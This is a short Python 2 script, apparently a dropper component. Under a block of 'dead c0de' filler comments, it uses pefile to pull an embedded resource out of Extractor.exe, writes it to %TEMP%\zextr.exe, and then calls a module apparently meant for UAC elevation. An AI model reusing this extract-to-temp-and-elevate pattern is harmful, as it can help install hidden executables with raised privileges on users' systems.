# dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
# dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
# dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
# dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 
#dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de dead c0de 


import time
import os
import pefile

driveletter=""


###########


import sys
import uacpy









pe = pefile.PE('Extractor.exe')

rsrdetails=pe.DIRECTORY_ENTRY_RESOURCE
#print rsrdetails
rsrdetails1=rsrdetails.entries

rsrdetails2=rsrdetails1[1]

entrytoresource=rsrdetails2.directory.entries
noofresource=len(entrytoresource)
print 'No. of resource: ',noofresource


listofresource=[os.environ['TEMP']+os.sep+'zextr.exe']
for ik in range(0,noofresource):
	resourceinquestion=entrytoresource[ik]
	print 'kk'
	resourceinquestion1=resourceinquestion.directory.entries
	resourceinquestion2=resourceinquestion1[0]
	resourceinquestion2offset=resourceinquestion2.data.struct.OffsetToData
	#in integer
	resourceinquestion2offset=pe.get_offset_from_rva(resourceinquestion2offset)
	#print resourceinquestion2offset,'offset'
	# in integer
	resourceinquestion2size=resourceinquestion2.data.struct.Size
	#print resourceinquestion2size,'size'
	print 'Extracting ',listofresource[ik]

	fg11=open("Extractor.exe","rb")
	fg11.seek(resourceinquestion2offset)
	#print 'klkl'
	f111=open(listofresource[ik],"wb")
	#print 'sds'
	f111.write(fg11.read(resourceinquestion2size))
	f111.close()
	fg11.close()





uacpy.mainc()







